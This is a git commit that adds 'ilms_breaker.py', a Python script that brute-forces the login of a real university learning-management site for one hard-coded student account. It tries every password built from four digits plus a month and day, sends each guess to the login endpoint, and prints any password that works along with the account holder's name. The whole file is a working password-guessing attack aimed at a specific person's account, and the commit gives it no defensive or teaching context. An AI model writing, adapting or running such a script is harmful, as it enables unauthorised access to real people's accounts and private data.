ae1ca5221d87d4ba5fc31efefb6ff27b62e5c8c0
Chia-Chi, Chen <abab5207@gmail.com>
2018-06-02 01:55:16 +0800

    Add files via upload

---
+++ ilms_breaker.py
@@ -0,0 +1,28 @@
+import urllib
+import json
+from time import sleep
+
+url_base = "http://lms.nthu.edu.tw/sys/lib/ajax/login_submit.php"
+account = "106061702"
+start_month = 1
+
+
+def login(password):
+    print "Trying", password
+    url = url_base + "?account=" + account + "&password=" + password
+    response = urllib.urlopen(url)
+    data = json.loads(response.read())
+    print data
+    status = data["ret"]["status"]
+    if(status != "false"):
+        print password
+        print data["ret"]["name"]
+
+
+for month in range(start_month, 13):
+    for day in range(1, 32):
+        print "Trying", month, day
+        for i in range(10000):
+            password = str(i).zfill(4) + str(month).zfill(2) + str(day).zfill(2)
+            login(password)
+            sleep(0.25)
